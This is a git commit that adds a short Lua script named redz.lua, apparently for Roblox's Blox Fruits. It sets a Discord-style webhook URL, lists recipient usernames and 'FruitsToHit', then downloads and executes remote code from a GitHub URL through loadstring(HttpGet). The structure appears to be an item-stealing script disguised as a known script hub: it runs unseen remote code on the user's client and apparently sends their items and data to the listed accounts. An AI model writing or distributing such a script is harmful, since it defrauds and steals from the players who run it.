7ccd40ac01433c37399128fdc9497853666a9d8e
Nhatminhcdk <nguyennhatminhcdk@gmail.com>
2025-04-08 19:00:01 +0700

    Create redz.lua

---
+++ redz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=eTYxTEh1RUQ5YU0tdFNraEhsVVBPZzozZ2FBMUUyeUlFNEVaUlZpN1RQM3FlelBPcGVvRnJuVlFHdDVCMHFGRTRzVHRaVmxLUDFnSXNERXhuM3FFaW5IbGZnSVpIS3RDYlo4YV8ybENyZ3dvblRiMTdPM2hDV0YzZ3ptQ3ZKRGpFMWdFaW5ueHhLX2ZoYWpvS1ZOTlprb2xjb3dPUFV6M0Q3UlpNUTBqTVh3RDB3czl6VnhmX3MzOGFpam5WN0lJbDA"
+Usernames = {"mfzgnr", "tarronfj", "fritzowjr"} 
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"} 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
